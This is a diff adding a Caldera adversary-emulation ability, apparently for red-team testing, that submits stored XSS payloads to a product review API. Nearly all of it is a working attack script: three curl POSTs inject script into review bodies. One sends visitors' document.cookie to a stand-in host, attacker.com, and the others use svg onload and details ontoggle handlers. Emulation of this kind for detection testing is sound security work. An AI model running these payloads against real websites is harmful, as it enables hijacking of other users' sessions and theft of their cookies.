@@ -1,0 +1,53 @@
+- id: d2b3c4d5-6e7f-8a9b-0c1d-f2a3b4c5d6e7
+  name: Stored XSS - Product Review Script Injection
+  description: 상품 리뷰 작성 API에 악성 스크립트를 삽입하여 Stored XSS를 시도합니다. 서버가 리뷰 본문을 sanitize하지 않으면 다른 사용자가 열람 시 스크립트가 실행됩니다. Reflected XSS보다 영향도가 높은 Persistent XSS 공격입니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1059.007
+    name: 'Command and Scripting Interpreter: JavaScript'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.007"
+          ABILITY_ID="d2b3c4d5-6e7f-8a9b-0c1d-f2a3b4c5d6e7"
+          TARGET="http://#{target.url}"
+
+          echo "[*] Stored XSS Attempt 1: <script> in review body"
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: ${TECH_ID}" \
+            -H "X-Caldera-Ability: ${ABILITY_ID}" \
+            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+            -d '{"productId":1,"content":"Great product!<script>fetch(\"http://attacker.com/steal?c=\"+document.cookie)</script>","rating":5}' \
+            "${TARGET}/api/reviews"
+          echo ""
+
+          echo "[*] Stored XSS Attempt 2: SVG onload in review"
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: ${TECH_ID}" \
+            -H "X-Caldera-Ability: ${ABILITY_ID}" \
+            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+            -d '{"productId":2,"content":"Nice! <svg onload=alert(document.domain)>","rating":4}' \
+            "${TARGET}/api/reviews"
+          echo ""
+
+          echo "[*] Stored XSS Attempt 3: Event handler in review"
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: ${TECH_ID}" \
+            -H "X-Caldera-Ability: ${ABILITY_ID}" \
+            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+            -d '{"productId":3,"content":"<details open ontoggle=alert(1)>click</details>","rating":3}' \
+            "${TARGET}/api/reviews"
+          echo ""
+
+          echo "[+] Stored XSS payloads submitted — check review pages for execution"
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.xss.stored
